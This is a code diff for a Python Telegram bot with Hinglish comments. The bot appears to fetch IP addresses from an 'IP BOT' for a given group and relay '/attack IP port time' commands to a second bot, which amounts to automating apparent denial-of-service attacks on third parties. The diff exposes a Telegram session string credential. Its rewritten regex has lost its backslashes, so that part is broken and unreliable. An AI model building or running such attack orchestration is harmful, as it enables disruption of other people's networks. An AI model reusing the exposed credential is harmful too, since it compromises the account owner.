@@ -18,19 +18,23 @@ STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qU
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
-chat_targets: dict[int, str] = {}      # chat_id -> link/chatid
-loop_tasks: dict[int, asyncio.Task] = {}   # chat_id -> task
-waiting_futures: dict[int, asyncio.Future] = {}  # chat_id -> future
+# chat_id -> target, chat_id -> telethon task, chat_id -> future for IP reply
+chat_targets: dict[int, str] = {}
+loop_tasks: dict[int, asyncio.Task] = {}
+waiting_futures: dict[int, asyncio.Future] = {}
 bot_b_status = "UNKNOWN"
 
-IP_CMD_REGEX = re.compile(r"/attack\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+)",re.I)
+IP_CMD_REGEX = re.compile(
+    r"/attacks+(d+.d+.d+.d+)s+(d+)s+(d+)",
+    re.I,
+)
 
 # ------------- BOT-A LISTENER (IP BOT) -------------
 @tele.on(events.NewMessage(from_users=BOT_A))
 async def bot_a_listener(event):
     text = event.text or ""
     print("IP BOT REPLY:", text)
-    # sabhi wait kar rahe futures me se first open ko resolve karo
+    # sabse pehle open future ko resolve karo
     for cid, fut in list(waiting_futures.items()):
         if not fut.done():
             fut.set_result(text)
@@ -53,8 +57,9 @@ async def bot_b_listener(event):
         bot_b_status = "UNKNOWN"
 
 
-# ------------- CORE LOOP PER CHAT -------------
-async def main_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+# ------------- CORE LOOP PER CHAT (Telethon loop) -------------
+async def telethon_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    """Har chat ke liye IP BOT se /attack cmd lekar BOT_B ko bhejta rahega."""
     global bot_b_status
 
     while True:
@@ -62,9 +67,8 @@ async def main_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
         if not target:
             return
 
-        # 1) Ask IP BOT
-        loop = asyncio.get_event_loop()
-        fut = loop.create_future()
+        # 1) IP BOT se .getip all
+        fut = tele.loop.create_future()
         waiting_futures[chat_id] = fut
 
         await tele.send_message(BOT_A, f".getip all {target}")
@@ -84,7 +88,7 @@ async def main_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
 
         attack_cmd = match.group(0)
 
-        # 2) Wait until BOT_B is READY
+        # 2) BOT_B READY hone tak wait
         while True:
             await tele.send_message(BOT_B, "/status")
             await asyncio.sleep(2)
@@ -92,16 +96,21 @@ async def main_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
                 break
             await asyncio.sleep(5)
 
-        # 3) Send attack command to BOT_B
+        # 3) BOT_B ko /attack bhejo
         await tele.send_message(BOT_B, attack_cmd)
-        await context.bot.send_message(chat_id,f"✅ Task sent:\n`{attack_cmd}`",parse_mode="Markdown")
+        await context.bot.send_message(
+            chat_id,
+            f"✅ Task sent:
+`{attack_cmd}`",
+            parse_mode="Markdown",
+        )
         await asyncio.sleep(3)
 
 
 # ------------- PTB COMMANDS -------------
 async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.args:
-        await update.message.reply_text("Usage:/setlinkchatid <group_link_or_chatid>")
+        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
         return
 
     chat_targets[update.effective_chat.id] = " ".join(context.args)
@@ -114,7 +123,8 @@ async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Loop already running")
         return
 
-    task = asyncio.create_task(main_loop(cid, context))
+    # Telethon ke loop par task run karo
+    task = tele.loop.create_task(telethon_loop(cid, context))
     loop_tasks[cid] = task
     await update.message.reply_text("🔁 Loop started")
 
@@ -152,8 +162,7 @@ def main():
     app.add_handler(CommandHandler("stoploop", stoploop))
 
     print("🤖 Control bot running")
-    # yahan koi asyncio.run ya await nahi
-    app.run_polling()
+    app.run_polling()   # yahan koi asyncio.run / await nahi
 
 
 if __name__ == "__main__":
